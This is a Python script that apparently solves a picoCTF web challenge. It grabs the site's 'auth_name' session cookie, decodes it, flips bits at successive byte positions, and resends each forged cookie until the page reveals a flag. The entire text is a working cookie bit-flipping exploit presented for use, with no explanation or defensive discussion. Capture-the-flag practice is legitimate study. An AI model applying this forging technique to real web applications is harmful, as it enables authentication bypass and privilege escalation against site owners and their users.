#!/usr/bin/python3

import requests
from base64 import *
from sys import argv, exit
from re import findall

url = argv[1]
s = requests.Session()

def get_cookie(url, s):
	s.get(url)
	cookie = s.cookies["auth_name"]
	#print(cookie)
	return cookie

def bitFlip(pos, bit, data):
	raw = b64decode(b64decode(data))

	list1 = bytearray(raw)
	list1[pos] = list1[pos] ^ bit
	raw = bytes(list1)
	return b64encode(b64encode(raw)).decode()

#cipher_text = "ZU9tQVA3aW5TTHJ6aW5YZElFNHYyRXEvWS9RTXY1d1djNVlvbGw3NDg3cGJ6S2dUREsrY1ROb2xYMWU4NXNTdi8vazlxZEFXbHgrS0RGYTFNTFg4d2dpZU5VZGJGNVF6dm9Qem94VjVOSGpSclRHZ2hxRHQxdEViZmlvdklwZ1Y="
cipher_text = get_cookie(url, s)

print("[*]Trying...")
print("Flag: ",end="")

for i in range(10):
	for j in range(128):
		c = bitFlip(i, j, cipher_text)
		cookies = {"auth_name": c}
		r = requests.get(url, cookies=cookies)
		if("picoCTF" in r.text):
			print(findall("picoCTF{.*}", r.text)[0])
			#print(r.text)
			exit(0)
